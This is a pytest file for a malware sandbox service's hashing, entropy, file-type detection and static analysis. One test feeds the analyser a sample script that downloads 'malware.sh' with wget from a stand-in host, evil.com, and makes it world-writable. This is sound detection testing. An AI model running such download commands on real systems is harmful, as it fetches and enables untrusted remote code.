"""Tests for the malware sandbox service."""

import tempfile
from pathlib import Path

from app.services.sandbox_service import (
    FileMetadata,
    StaticAnalysisResult,
    DynamicAnalysisResult,
    SandboxReport,
    compute_hashes,
    calculate_entropy,
    detect_file_type,
    analyze_static,
    analyze_bytes,
)


class TestHashing:
    """Test hash computation."""

    def test_empty_data(self):
        md5, sha1, sha256 = compute_hashes(b"")
        assert md5 == "d41d8cd98f00b204e9800998ecf8427e"
        assert len(sha1) == 40
        assert len(sha256) == 64

    def test_known_hash(self):
        md5, sha1, sha256 = compute_hashes(b"hello")
        assert md5 == "5d41402abc4b2a76b9719d911017c592"

    def test_deterministic(self):
        h1 = compute_hashes(b"test data")
        h2 = compute_hashes(b"test data")
        assert h1 == h2


class TestEntropy:
    """Test entropy calculation."""

    def test_empty(self):
        assert calculate_entropy(b"") == 0.0

    def test_low_entropy(self):
        data = b"AAAAAAAAAA"
        entropy = calculate_entropy(data)
        assert entropy == 0.0

    def test_high_entropy(self):
        data = bytes(range(256))
        entropy = calculate_entropy(data)
        assert entropy == 8.0  # Maximum for byte data

    def test_medium_entropy(self):
        data = b"Hello World! " * 10
        entropy = calculate_entropy(data)
        assert 2.0 < entropy < 5.0


class TestFileTypeDetection:
    """Test magic byte file type detection."""

    def test_elf(self):
        ft, mime = detect_file_type(b"\x7fELF\x02\x01\x01")
        assert ft == "ELF executable"
        assert mime == "application/x-elf"

    def test_pe(self):
        ft, mime = detect_file_type(b"MZ\x90\x00\x03")
        assert ft == "PE executable"
        assert mime == "application/x-dosexec"

    def test_png(self):
        ft, mime = detect_file_type(b"\x89PNG\r\n\x1a\n")
        assert ft == "PNG image"
        assert mime == "image/png"

    def test_shell_script(self):
        ft, mime = detect_file_type(b"#!/bin/bash\necho hello")
        assert ft == "Shell script"
        assert mime == "text/x-shellscript"

    def test_text(self):
        ft, mime = detect_file_type(b"just plain text")
        assert ft == "Text file"
        assert mime == "text/plain"

    def test_binary(self):
        ft, mime = detect_file_type(b"\x00\x01\x02\xff\xfe\xfd")
        assert ft == "Binary file"
        assert mime == "application/octet-stream"

    def test_gzip(self):
        ft, mime = detect_file_type(b"\x1f\x8b\x08\x00")
        assert ft == "Gzip archive"
        assert mime == "application/gzip"


class TestStaticAnalysis:
    """Test full static analysis."""

    def test_clean_text_file(self):
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=True) as f:
            f.write(b"Hello, this is a normal text file.\n")
            f.flush()
            result = analyze_static(Path(f.name))
            assert result.verdict in ("clean", "unknown")
            assert result.risk_score < 40
            assert result.is_executable is False

    def test_suspicious_script(self):
        content = b"#!/bin/bash\nwget http://evil.com/malware.sh\nchmod 777 malware.sh\n"
        with tempfile.NamedTemporaryFile(suffix=".sh", delete=True) as f:
            f.write(content)
            f.flush()
            result = analyze_static(Path(f.name))
            assert result.risk_score > 0
            assert len(result.matched_patterns) > 0
            assert result.is_executable is True
            assert len(result.urls_found) >= 1

    def test_file_with_ips(self):
        content = b"Connect to 10.0.0.1 and 192.168.1.1 for C2"
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=True) as f:
            f.write(content)
            f.flush()
            result = analyze_static(Path(f.name))
            assert len(result.ips_found) >= 2

    def test_analyze_bytes_helper(self):
        result = analyze_bytes(b"simple text content", filename="test.txt")
        assert result.file.filename == "test.txt"
        assert result.file.size_bytes == 19


class TestDataModels:
    """Test sandbox data models."""

    def test_file_metadata(self):
        meta = FileMetadata(
            filename="test.bin",
            size_bytes=1024,
            md5="abc",
            sha1="def",
            sha256="ghi",
        )
        assert meta.mime_type == "application/octet-stream"
        assert meta.file_type == "unknown"

    def test_dynamic_result(self):
        result = DynamicAnalysisResult(
            task_id="task-001",
            status="completed",
            score=8.5,
            signatures=["ransomware", "crypto"],
        )
        assert result.task_id == "task-001"
        assert result.score == 8.5
        assert len(result.signatures) == 2

    def test_sandbox_report(self):
        static = StaticAnalysisResult(
            file=FileMetadata(
                filename="test", size_bytes=0, md5="", sha1="", sha256=""
            ),
            risk_score=50,
            verdict="suspicious",
        )
        report = SandboxReport(static=static, overall_verdict="suspicious", overall_score=50)
        assert report.overall_verdict == "suspicious"
        assert report.dynamic is None
